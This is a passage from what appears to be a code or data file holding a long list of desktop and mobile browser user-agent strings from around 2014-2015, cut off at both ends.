Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 Safari', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/8.0; 1ButtonTaskbar)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; NP08; MAAU; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 5.1; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSMSE; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0', 'Mozilla/5.0 (Windows NT 5.1; rv:35.0) Gecko/20100101 Firefox/35.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; XT1254 Build/SU3TL-39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12B440 Safari/600.1.4', 'Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12F69 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG-SGH-I337 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.3; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36', 'Mozilla/5.0 (X11; CrOS armv7l 7077.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/38.0.2125.102 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAGWJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; ATT-IE11; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12D508 Safari/600.1.4', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; MSN 9.0;MSN 9.1;MSN 9.6;MSN 10.0;MSN 10.2;MSN 10.5;MSN 11;MSN 11.5; MSNbMSNI; MSNmen-us; MSNcOTH) like Gecko', 'Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; 1ButtonTaskbar)', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 YaBrowser/15.7.2357.2877 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSMSNIP; rv:11.0) like Gecko', 'Mozilla/5.0 AppleWebKit/999.0 (KHTML, like Gecko) Chrome/99.0 Safari/999.0', 'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAGWJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.2; GT-N5110 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12B410 Safari/600.1.4', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.7) Gecko/20150824 Firefox/31.9 PaleMoon/25.7.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:39.0) Gecko/20100101 Firefox/39.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13A4325c Safari/601.1', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; MS-RTC LM 8; InfoPath.3)', 'Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; EIE10;ENUSWOL; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.4; en-us; SAMSUNG SM-N910T Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.0.4; en-ca; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.45 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0', 'Mozilla/5.0 (Linux; Android 4.4.2; RCT6773W22 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.7) Gecko/20150824 Firefox/31.9 PaleMoon/25.7.0', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G870A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.3; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)', 'Mozilla/5.0 (Windows NT 5.2; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSMCM; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MALCJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.2; rv:29.0) Gecko/20100101 Firefox/29.0 /29.0', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-P900 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 9 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-T330NU Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1', 'Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MALCJS; rv:11.0) like Gecko', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/8.0.57838 Mobile/11D257 Safari/9537.53', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; yie10; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/8.0; TNJB; 1ButtonTaskbar)', 'Mozilla/5.0 (Linux; Android 4.4.2; RCT6773W22 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T210R Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.18.US Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-T350 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0; 1ButtonTaskbar)', 'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG-SM-G920A Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/38.0.2125.102 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MAAU; MAAU; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MANM; MANM; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; QTAQZ3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 OverDrive Media Console/3.3.1', 'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257', 'Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 